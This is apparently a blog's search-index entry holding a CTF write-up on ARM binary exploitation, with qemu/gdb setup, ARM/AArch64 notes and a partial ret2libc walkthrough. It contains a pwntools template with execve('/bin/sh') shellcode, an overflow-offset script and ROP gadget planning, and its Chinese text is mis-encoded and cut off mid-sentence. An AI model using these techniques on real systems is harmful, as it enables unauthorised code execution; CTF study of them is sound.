<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¼‚æ„PWN(2)-ARMï¼ˆ2025é¢†èˆªæ¯_arm-ret2libcï¼‰</title>
      <link href="/2025/10/16/yigou-pwn2/"/>
      <url>/2025/10/16/yigou-pwn2/</url>
      
        <content type="html"><![CDATA[<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="https://xz.aliyun.com/news/15999">æ·±å…¥å¼‚æ„ PWNï¼šPowerPC&amp;ARM&amp;MIPS-å…ˆçŸ¥ç¤¾åŒº</a></li><li><a href="https://bbs.kanxue.com/thread-272332.htm">[åŸåˆ›] CTF ä¸­ ARM &amp; AArch64 æ¶æ„ä¸‹çš„ Pwn-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|éè¥åˆ©æ€§è´¨æŠ€æœ¯äº¤æµç¤¾åŒº</a></li></ul><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu</span><br><span class="line">sudo apt-get install qemu-user  </span><br><span class="line">sudo apt-get install qemu-user-binfmt  </span><br><span class="line">sudo apt-get install <span class="string">&quot;binfmt*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##æœç´¢libc</span></span><br><span class="line">sudo apt search <span class="string">&quot;libc6&quot;</span> | grep arm</span><br><span class="line"><span class="comment">##æ ¹æ®è¾“å‡ºï¼Œè‡ªè¡Œé€‰æ‹©æ‰€éœ€çš„åº“,å¦‚ï¼š</span></span><br><span class="line">sudo apt install libc6-armel-cross  <span class="comment">#å¯¹åº”arm32</span></span><br><span class="line">sudo apt install libc6-dbg-arm64-cross <span class="comment">#å¯¹åº”arm64</span></span><br></pre></td></tr></table></figure><p><a href="http://ports.ubuntu.com/pool/main/g/glibc/">http://ports.ubuntu.com/pool/main/g/glibc/</a></p><h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-arm -L /path/to/lib ./pwn</span><br></pre></td></tr></table></figure><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-arm -L /path/to/lib -g 1234./pwn</span><br><span class="line"><span class="comment">#æ–°å¼€ä¸€ä¸ªç»ˆç«¯</span></span><br><span class="line">gdb-multiarch</span><br><span class="line">attach 1234</span><br></pre></td></tr></table></figure><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x104f0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.execve(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;,&quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;-g&quot;,&quot;1234&quot;, &quot;pwn&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line">ggg()</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç›¸å…³çŸ¥è¯†"><a href="#ç›¸å…³çŸ¥è¯†" class="headerlink" title="ç›¸å…³çŸ¥è¯†"></a>ç›¸å…³çŸ¥è¯†</h2><h3 id="æŒ‡ä»¤å­¦ä¹ "><a href="#æŒ‡ä»¤å­¦ä¹ " class="headerlink" title="æŒ‡ä»¤å­¦ä¹ "></a>æŒ‡ä»¤å­¦ä¹ </h3><ul><li><strong>MOVï¼š</strong> æ•°æ®ä¼ è¾“æŒ‡ä»¤ï¼Œç”¨äºå°†æ•°æ®ä»ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜ä¸­å¤åˆ¶åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜ä¸­ã€‚</li><li><strong>ADD/SUBï¼š</strong> åŠ æ³•å’Œå‡æ³•æŒ‡ä»¤ã€‚</li><li><strong>CMPï¼š</strong> æ¯”è¾ƒæŒ‡ä»¤ï¼Œæ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„å¤§å°å…³ç³»ã€‚</li><li><strong>Bï¼š</strong> åˆ†æ”¯æŒ‡ä»¤ï¼Œç”¨äºæ— æ¡ä»¶è·³è½¬åˆ°æŒ‡å®šåœ°å€ã€‚</li><li><strong>BLï¼š</strong> åˆ†æ”¯æŒ‡ä»¤ï¼Œç”¨äºè·³è½¬åˆ°æŒ‡å®šåœ°å€å¹¶å°†è¿”å›åœ°å€ä¿å­˜åœ¨LRå¯„å­˜å™¨ä¸­ï¼Œå¯ç”¨äºå‡½æ•°è°ƒç”¨ã€‚</li><li><strong>LDR/STRï¼š</strong> æ•°æ®ä¼ è¾“æŒ‡ä»¤ï¼Œç”¨äºä»å†…å­˜ä¸­è¯»å–æ•°æ®æˆ–å°†æ•°æ®å†™å…¥å†…å­˜ã€‚<ul><li>LDR ç”¨äºå°†æŸäº›å†…å®¹ä»å†…å­˜åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œä¾‹å¦‚ <code>LDR R2, [R0]</code> ä»R0å¯„å­˜å™¨ä¸­å­˜å‚¨çš„å†…å­˜åœ°å€çš„å€¼è¯»å…¥R2å¯„å­˜å™¨ã€‚</li><li>STR ç”¨äºå°†æŸäº›å†…å®¹ä»å¯„å­˜å™¨å­˜å‚¨åˆ°å†…å­˜åœ°å€ä¸­ï¼Œä¾‹å¦‚ <code>STR R2, [R1]</code> ä»R2å¯„å­˜å™¨ä¸­å°†å€¼å­˜å‚¨åˆ°R1å¯„å­˜å™¨ä¸­çš„å†…å­˜åœ°å€ä¸­ã€‚</li></ul></li><li><strong>PUSH/POPï¼š</strong> æ ˆæ“ä½œæŒ‡ä»¤ï¼Œç”¨äºå°†å¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆæˆ–ä»æ ˆä¸­å¼¹å‡ºæ•°æ®ã€‚</li></ul><div class="table-container"><table><thead><tr><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>MOV</td><td>ç§»åŠ¨æ•°æ®</td><td>EOR</td><td>æŒ‰ä½å¼‚æˆ–</td></tr><tr><td>MVN</td><td>ç§»åŠ¨æ•°æ®å¹¶å–å</td><td>LDR</td><td>åŠ è½½</td></tr><tr><td>ADD</td><td>åŠ æ³•</td><td>STR</td><td>å­˜å‚¨</td></tr><tr><td>SUB</td><td>å‡æ³•</td><td>LDM</td><td>åŠ è½½å¤šä¸ª</td></tr><tr><td>MUL</td><td>ä¹˜æ³•</td><td>STM</td><td>å­˜å‚¨å¤šä¸ª</td></tr><tr><td>LSL</td><td>é€»è¾‘å·¦ç§»</td><td>PUSH</td><td>å…¥æ ˆ</td></tr><tr><td>LSR</td><td>é€»è¾‘å³ç§»</td><td>POP</td><td>å‡ºæ ˆ</td></tr><tr><td>ASR</td><td>ç®—æœ¯å³ç§»</td><td>B</td><td>è·³è½¬</td></tr><tr><td>ROR</td><td>å³æ—‹</td><td>BL</td><td>Link+è·³è½¬</td></tr><tr><td>CMP</td><td>æ¯”è¾ƒ</td><td>BX</td><td>åˆ†æ”¯è·³è½¬</td></tr><tr><td>AND</td><td>æŒ‰ä½ä¸</td><td>BLX</td><td>Linx+åˆ†æ”¯è·³è½¬</td></tr><tr><td>ORR</td><td>æŒ‰ä½æˆ–</td><td>SWI/SVC</td><td>ç³»ç»Ÿè°ƒç”¨</td></tr></tbody></table></div><h3 id="æ ˆå¸§ç»“æ„"><a href="#æ ˆå¸§ç»“æ„" class="headerlink" title="æ ˆå¸§ç»“æ„"></a>æ ˆå¸§ç»“æ„</h3><p><img src="/2025/10/16/yigou-pwn2/20241205141954-f14caeee-b2d0-1.png" alt="20241205141954-f14caeee-b2d0-1" style="zoom:50%;"></p><h3 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h3><div class="table-container"><table><thead><tr><th>å¯„å­˜å™¨</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>R0</td><td>å­˜å‚¨å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æˆ–å‡½æ•°çš„è¿”å›ç»“æœã€‚</td></tr><tr><td>R13 ï¼ˆå †æ ˆæŒ‡é’ˆSPï¼‰</td><td>æŒ‡å‘å †æ ˆçš„é¡¶éƒ¨</td></tr><tr><td>R14ï¼ˆé“¾æ¥å¯„å­˜å™¨LRï¼‰</td><td>é“¾æ¥å¯„å­˜å™¨ï¼Œç”¨äºå­˜æ”¾å‡½æ•°è°ƒç”¨ç»“æŸå¤„çš„è¿”å›åœ°å€ã€‚</td></tr><tr><td>R15ï¼ˆç¨‹åºè®¡æ•°å™¨PCï¼‰</td><td>ç¨‹åºè®¡æ•°å™¨ã€‚</td></tr></tbody></table></div><p><code>ARM</code> æ¶æ„ä¸‹çš„å‡½æ•°è°ƒç”¨çº¦å®šä¸ºï¼Œå‡½æ•°çš„å‰å››ä¸ªå‚æ•°ä¿å­˜åœ¨å¯„å­˜å™¨ <code>R0 - R3</code> ä¸­ï¼Œ å‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œ è¢«è°ƒç”¨è€…å®ç°æ ˆå¹³è¡¡ï¼Œå‡½æ•°çš„è¿”å›å€¼ä¿å­˜åœ¨ <code>R0</code> ä¸­ï¼Œ<code>R7</code>å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·(arm32 ä¸‹ï¼Œread çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 3ï¼Œexecve çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 0xb)ï¼Œ<code>R11ï¼ˆFPï¼‰</code>ç›¸å½“äº<code>rbp</code>ï¼Œ<br><code>R13ï¼ˆSPï¼‰</code>ç›¸å½“äº<code>rsp</code>ï¼Œ<code>R14ï¼ˆLRï¼‰</code>ç”¨æ¥å­˜æ”¾å‡½æ•°è¿”å›åœ°å€ï¼Œ<code>R15ï¼ˆPCï¼‰</code>ç›¸å½“äº<code>rip</code>ï¼Œ<code>x64</code>å‡½æ•°è¿”å›çš„æ—¶å€™å¤§å¤šæ˜¯é€šè¿‡<code>leave ret</code>æ¥è¿”å›çš„ï¼Œè€Œarmæ˜¯é€šè¿‡<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub    sp, r11, #4 å°†r11å‡4çš„å€¼ä¼ ç»™sp</span><br><span class="line">pop    &#123;r11, pc&#125; #æ¢å¤rbpï¼Œå’Œpc</span><br></pre></td></tr></table></figure><br>æ¥è¿›è¡Œæ ˆå›æº¯çš„ï¼Œå½“ç„¶æˆ‘ä»¬ç†Ÿæ‚‰çš„<code>pop</code>å’Œ<code>push</code>æŒ‡ä»¤ä¹Ÿéƒ½æœ‰<br>armä¸­æ²¡æœ‰<code>call funk</code>çš„æ±‡ç¼–ï¼Œåªæœ‰<code>B funk</code>ï¼Œ<code>BL funk</code>ï¼Œ<code>BX funk</code>ï¼Œ<code>BLX funk</code>æ¥è¿›è¡Œè·³è½¬<br>Bå°±ç›¸å½“äº<code>jmp</code>ï¼Œä¸€èˆ¬å½¢å†µä¸‹<code>BL</code>ç›¸å½“äº<code>call</code>ï¼Œ<code>BL</code>ä¼šè·³è½¬åˆ°æŒ‡å®šä½ç½®æ‰§è¡Œä»£ç ï¼Œç„¶åå°†å½“å‰ä½ç½®çš„<code>PC</code>å€¼ä¿å­˜åˆ°<code>LR</code>ä¸­ï¼Œä¹Ÿå°±æ˜¯å°†è¿”å›åœ°å€ä¿å­˜åˆ°äº†<code>LR</code>ä¸­</p><p>ç„¶åæ˜¯<code>ldr</code>ï¼ˆåŠ è½½æŒ‡ä»¤ï¼‰å’Œ<code>str</code>ï¼ˆå­˜å‚¨æŒ‡ä»¤ï¼‰è¿™ä¸¤ä¸ªæŒ‡ä»¤çš„å«ä¹‰<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldr r2, [r1], #-2 å°†r1åœ°å€ä¸­çš„å€¼ä¼ ç»™r2ï¼Œç„¶år1-=2</span><br><span class="line">ldr r2, [r1], r3, LSL#2  å°†r1åœ°å€ä¸­çš„å€¼ä¼ ç»™r2ï¼Œç„¶år1+=r3&lt;&lt;2</span><br><span class="line">str r2, [r1, #2]  å°†r2ä¸­çš„å€¼å­˜å‚¨åˆ°r1ä¸­çš„åœ°å€åŠ 2å¤„çš„åœ°å€ä¸­</span><br><span class="line">str r2, [r1, r3, LSL#2]  å°†r2ä¸­çš„å€¼å­˜å‚¨åˆ°r1ä¸­çš„åœ°å€åŠ ä¸Šr3ä¸­çš„å€¼å·¦ç§»ä¸¤ä½åçš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­</span><br></pre></td></tr></table></figure></p><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><p><code>AARCH64</code> æ¶æ„ä¸‹çš„å‡½æ•°è°ƒç”¨çº¦å®šä¸ºï¼Œå‡½æ•°çš„å‰å…­ä¸ªå‚æ•°ä¿å­˜åœ¨å¯„å­˜å™¨ <code>X0 - X5</code> ä¸­ã€‚ä¸ARMæ¶æ„ä¸åŒçš„æ˜¯ï¼Œ<code>AARCH64</code> æ¶æ„ä¸‹ï¼Œè¢«è°ƒç”¨è€…ä¸éœ€è¦å®ç°æ ˆå¹³è¡¡ï¼Œç”±è°ƒç”¨è€…è´Ÿè´£æ ˆå¹³è¡¡ï¼Œ<code>X0</code>å­˜æ”¾å‡½æ•°è¿”å›å€¼ï¼Œå¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªç»“æ„ä½“æˆ–ç±»ä¼¼çš„è¾ƒå¤§çš„æ•°æ®ç±»å‹ï¼Œåˆ™ä¼šä½¿ç”¨ <code>x0</code> å’Œ <code>x1</code> å¯„å­˜å™¨è®°å½•è¿”å›å€¼<code>X8</code>å¸¸ç”¨æ¥å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·æˆ–ä¸€äº›å‡½æ•°çš„è¿”å›ç»“æœï¼Œ<code>x32</code>æ˜¯<code>PC</code>å¯„å­˜å™¨ï¼Œæ ˆé¡¶æ˜¯<code>X31(SP)</code>å¯„å­˜å™¨ï¼Œæ ˆå¸§æ˜¯<code>X29(FP)</code>å¯„å­˜å™¨ï¼Œ<code>X30(LR)</code>å­˜æ”¾ç€å‡½æ•°çš„è¿”å›åœ°å€</p><p>å¯¹äºBç±»çš„è·³è½¬æŒ‡ä»¤ï¼Œæ–°å¢äº†BRæŒ‡ä»¤ï¼Œå¯ä»¥å‘å¯„å­˜å™¨é‡Œçš„åœ°å€è·³è½¬<br>å€¼å¾—ç•™æ„çš„æ˜¯ï¼Œaarch64ä¸­æ²¡æœ‰äº†popå’ŒpushæŒ‡ä»¤ï¼Œè€Œæ˜¯é€šè¿‡STPå’ŒLDPæ¥å®ç°çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stp    x29, x30, [sp, #-0x50]! å°†x29çš„å€¼pushåˆ°sp-0X50å¤„,å°†x30çš„å€¼pushåˆ°sp-0x50+0x8å¤„,ç„¶åsp-=0x50(å¦‚æœåé¢æ²¡æœ‰ï¼å·çš„è¯ï¼Œspä¸å˜)</span><br><span class="line">ldp    x29, x30, [sp], #0x50  å°†spä¸­çš„å€¼popåˆ°x29ä¸­ï¼Œå°†sp+8ä¸­çš„å€¼popåˆ°x30ä¸­ï¼Œç„¶åå°†sp+=0x50</span><br><span class="line">è¯¸å¦‚æ­¤ç±»çš„ä½¿ç”¨æ–¹å¼</span><br></pre></td></tr></table></figure><p><code>aarch64</code>ä¸­æœ‰retæŒ‡ä»¤ï¼Œä½†<code>ret</code>å¹¶ä¸æ˜¯å°†æ˜¯<code>sp</code>ä¸­çš„å€¼<code>pop</code>å‡ºæ¥å½“ä½œä¸‹ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œï¼Œè€Œæ˜¯<code>ret</code>åˆ°<code>LR(x30)</code>ä¸­å‚¨å­˜çš„åœ°å€ç»§ç»­æ‰§è¡Œ</p><h2 id="é¢˜ç›®ï¼šé¢†èˆªæ¯2025-ARM-ROP-ret2libc"><a href="#é¢˜ç›®ï¼šé¢†èˆªæ¯2025-ARM-ROP-ret2libc" class="headerlink" title="é¢˜ç›®ï¼šé¢†èˆªæ¯2025 ARM-ROP-ret2libc"></a>é¢˜ç›®ï¼šé¢†èˆªæ¯2025 ARM-ROP-ret2libc</h2><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><h4 id="è¿è¡Œ-1"><a href="#è¿è¡Œ-1" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h4><p>ç»™äº†libcç‰ˆæœ¬,åœ¨ <a href="http://ports.ubuntu.com/pool/main/g/glibc/">http://ports.ubuntu.com/pool/main/g/glibc/</a> ä¸‹äº†ä¸€ä¸ªåŒä¸º2.27ç‰ˆæœ¬çš„ï¼Œé€šè¿‡<code>-L</code>æŒ‡å®šç‰ˆæœ¬ï¼Œè™½ç„¶ä»æœ‰å·®å¼‚ï¼Œä½†æœ¬åœ°æ‰“é€šåæ‰“è¿œç¨‹åªéœ€å¾®è°ƒå³å¯<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-arm  -g 12345 -L ./glibc-2.27 login_system</span><br></pre></td></tr></table></figure></p><h4 id="æŸ¥çœ‹ä¿æŠ¤"><a href="#æŸ¥çœ‹ä¿æŠ¤" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤"></a>æŸ¥çœ‹ä¿æŠ¤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â¯ checksec login_system</span><br><span class="line">[*] &#x27;/home/zechariah/æ¡Œé¢/LHB/login_system&#x27;</span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x10000)</span><br></pre></td></tr></table></figure><h4 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h4><p><img src="/2025/10/16/yigou-pwn2/Pasted image 20251016162115.png" alt="Pasted image 20251016162115" style="zoom:50%;"></p><h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p><code>canary</code>æ²¡å¼€ï¼Œæ˜¯æˆ‘å–œæ¬¢çš„é¢˜ï¼Œç›´æ¥æº¢å‡ºï¼<br>å…ˆæ‰¾ <code>gadget</code> å°è¯• <code>rop</code> æ³„éœ²<code>puts</code> åœ°å€ï¼Œè¿›è€Œå¯ä»¥å¾—åˆ° <code>libc</code> åŸºåœ°å€ï¼Œæœ€åæ‰“ä¸€ä¸ª <code>ret2libc</code> å³å¯ <code>getshell</code></p><h3 id="è§£é¢˜æµç¨‹"><a href="#è§£é¢˜æµç¨‹" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h3><h4 id="æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦"><a href="#æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦" class="headerlink" title="æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦"></a>æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;qemu-arm&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabi&#x27;, &#x27;./login_system&#x27;])</span></span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./glibc-2.27&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;11451&#x27;</span>, <span class="string">&#x27;login_system&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./login_system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(target=(<span class="string">&quot;localhost&quot;</span>, <span class="number">11451</span>), exe=elf.path)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Username: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Password: &#x27;</span>)</span><br><span class="line">p.sendline(cyclic(<span class="number">500</span>, n=<span class="number">4</span>))</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/10/16/yigou-pwn2/Pasted image 20251016160851.png" alt="Pasted image 20251016160851" style="zoom:50%;"></p><p><img src="/2025/10/16/yigou-pwn2/Pasted image 20251016160832.png" alt="Pasted image 20251016160832" style="zoom:50%;"></p><p>æº¢å‡ºé•¿åº¦260</p><h4 id="å¯»æ‰¾gedget"><a href="#å¯»æ‰¾gedget" class="headerlink" title="å¯»æ‰¾gedget"></a>å¯»æ‰¾gedget</h4><p><code>arm</code>ä¸­<code>pc</code>å°±ç›¸å½“äº<code>eip</code>,åªè¦èƒ½æ§åˆ¶<code>pc</code>æˆ‘ä»¬å°±èƒ½è¿›è¡Œ<code>rop</code>æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary login_system --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line"></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000105c0 : pop &#123;fp, pc&#125;</span><br><span class="line">0x000103f0 : pop &#123;r3, pc&#125;</span><br><span class="line">0x00010558 : pop &#123;r4, pc&#125;</span><br><span class="line">0x0001071c : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><br><img src="/2025/10/16/yigou-pwn2/Pasted image 20251016164140.png" alt="Pasted image 20251016164140" style="zoom:50%;">é€šè¿‡<code>pop &#123;r3, pc&#125;</code>å’Œ<code>0x000106c0 : mov r0, r3 ; pop &#123;fp, pc&#125;</code>æˆ‘ä»¬å¯ä»¥å®Œç¾æ§åˆ¶<code>r0</code>ï¼Œä¹Ÿå°±æ˜¯å‡½æ•°è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°<br>å€¼å¾—é«˜å…´çš„æ˜¯ï¼Œåœ¨æœ¬é¢˜ä¸­æˆ‘ä»¬åªéœ€å°†<code>puts</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å®šä¸º<code>puts@got</code>ï¼Œ<code>system</code>çš„å‚æ•°å®šä¸º<code>&amp;&quot;/bin/sh&quot;</code>å³å¯<code>getshell</code></p><p>ä½†å€¼å¾—ä¸€æçš„æ˜¯ï¼Œputså‡½æ•°çš„ç»“å°¾ä¼šæœ‰6æ¬¡<code>pop</code>ï¼Œæœ€åä¸€æ¬¡æ‰æ˜¯<code>pop pc</code><br><img src="/2025/10/16/yigou-pwn2/Pasted image 20251016165051.png" alt="Pasted image 20251016165051" style="zoom:50%;"></p><p>å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨<code>payload</code>ä¸­å¡«å……<strong>ä¸€å®šæ•°é‡</strong>çš„<code>junk</code>ä»¥ç²¾å‡†æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚</p><blockquote><p>å…·ä½“å¡«å……çš„æ•°é‡è¦åˆ†æé¢˜ç›®ç»™å‡ºçš„<code>libc</code>ä¸­<code>puts</code>çš„å…·ä½“å®ç°ï¼Œä¸åŒçš„<code>libc</code>å‡½æ•°æœ«å°¾çš„<code>pop</code>æ¬¡æ•°æ˜¯ä¸ä¸€æ ·çš„<br>å› 